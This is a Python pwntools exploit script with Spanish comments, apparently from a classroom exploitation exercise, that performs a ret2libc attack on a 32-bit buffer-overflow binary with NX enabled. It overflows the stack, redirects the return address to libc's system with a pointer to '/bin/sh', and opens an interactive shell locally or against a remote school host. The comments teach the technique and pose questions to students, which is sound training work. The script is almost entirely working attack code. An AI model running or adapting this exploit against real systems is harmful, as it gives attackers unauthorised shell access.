#!/usr/bin/python3
########################################################################
# En este ejercicio se hace un ret2libc.                               
# Se ha activado la protección NX, es decir, la pila no es ejecutable. 
# Como la pila no es ejecutable no sirve de nada insertar una shellcode.
# Si controlamos al dirección de retorno (ret) y ponemos una dirección de memoria sin permisos de ejecución, el sistema operativo
# detiene la ejecución. Existe denegación de servicio.
# Una solución básica es la técnica ret2libc.
# El binario se compila de forma dinámica, es decir, libc se carga en memoria de forma completa al ejecutar el programa.
# El valor de ret debe apuntar a la función system que se encuentra en libc. Esta función tiene un parámetro que es un puntero
# a un string que contiene el comando a ejecutar en el sistema.
# /bin/sh se puede inyectar en algún parámetro de entrada que se controle.
# En libc ya se encuentra la cadena por lo que podemos usarla y es más sencillo.
########################################################################
from pwn import *
elf = context.binary = ELF("bof")
libc = elf.libc
#Analiza el exploit. Funcionará en remoto con ASLR activado?
HOST = "www.iesvirgendelcarmen.com"
PORT = 10010

gs = '''
b start_level
continue
'''
def start():
    """
    Si ejecutamos:$ xpl.py sin parámetros io.sendXXX para enviar datos por entrada estandar al proceso. io.recXXX para leer datos salida estandar del proceso.
    Si ejecutamos:$ xpl.py GDB se abre una nueva ventana con el depurador
    Si ejecutamos:$ xpl.py REMOTE se abre un socket con servidor remoto. La entrada y salida funciona igual que en local.
    """
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
	    return remote(HOST, PORT)
    else:
        return process(elf.path)

io = start()
#Lee de la salida estandar hasta Leak:
io.recvuntil('Leak: ')
#Lee de la salida estandar hasta retorno de carro
leak = io.recvline()
#Convierte la dirección de memoria robada, que es un string, a un entero. La dirección de memoria está en base 16 (hexadecimal).
leak = int(leak, 16)
print(hex(leak))
#Este leak no sirve para ret2libc. Necesitariamos un leak de libc!!!!
log.info('Enviando shellcode')

#En realidad no necesitamos la shellcode. libc ya tiene la función system que permite ejecutar /bin/sh
#La técnica se llama ret2libc

#Dirección base de libc. ASLR Desactivado o necesitamos un leak de libc.
libc.address = 0xf7db2000
print(hex(libc.sym['system']))
print(hex(next(libc.search(b'/bin/sh'))))

#Generamos un payload en little endian para 32 bits
payload = flat (
    b"A"*46,
    b"BBBB",
    libc.sym['system'],    #Dirección de retorno es la de la función system de libc
    #Necesitamos un string a /bin/sh que es el comando que deseamos ejecutar y un puntero a dicho string.
    #Se puede insertar en el payload si conocemos la dirección de la pila ASR desactivado o existe un leak.
    #En realidad la cadena /bin/sh ya se encuentra en libc. La podemos buscar con pwn tools.
    b"CCCC", #Sabes el motivo de dejar este "hueco" de 4 bytes???? Piensa en como se pasan parámetros en la pila.
    next(libc.search(b'/bin/sh')), #Simulamos paso de parámetro a system. Un puntero al string que se dejea ejecutar. Consultar man system
    endianness = 'little', word_size = 32, sign = False
    )
print(len(payload))
#Enviamos el payload
io.sendline(payload)
print("Payload enviado.")
#Hacemos la sesión interactiva (entrada y salida estandar)
io.interactive()
